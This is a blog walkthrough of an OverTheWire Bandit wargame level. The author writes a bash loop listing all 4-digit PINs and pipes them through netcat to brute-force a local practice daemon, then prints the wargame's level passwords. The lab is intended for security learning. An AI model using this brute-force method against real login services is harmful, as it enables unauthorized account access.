ss---
layout: post
date:   2021-04-09 10:21:00 +0100
categories: OverTheWire Bandit
---

# Level goal
```bash
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
```

## This sounds like a loop and some other stuff, script time? Firstly.. Lets see what happens
```bash
bandit24@bandit:~$ mkdir /tmp/zd24
bandit24@bandit:~$ cd /tmp/zd24
bandit24@bandit:/tmp/zd24$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1234
Wrong! Please enter the correct pincode. Try again.
```

## Okay, looks like I'll need to echo the password and a random digit between (assuming) 0000 and 9999 - Lets learn stuff!

## Step 1: Make a script that just loops through everything.

```bash
#!/bin/bash
for i in {0000..9999}
do
attempt="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
echo "$attempt" >> list.txt
done
#This was after me breaking stuff... Script 23234
```

## Okay, now that drama is sorted lets generate the list then send it to netcat.

```bash
bandit24@bandit:/tmp/zd24$ ls
list.txt  script.sh
bandit24@bandit:/tmp/zd24$ cat list.txt | nc localhost 30002
...snip....
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
```


VICTORY.

## The password for level 21: 	
uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

On the next episode of Bandit...

```bash
ssh bandit25@localhost
uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```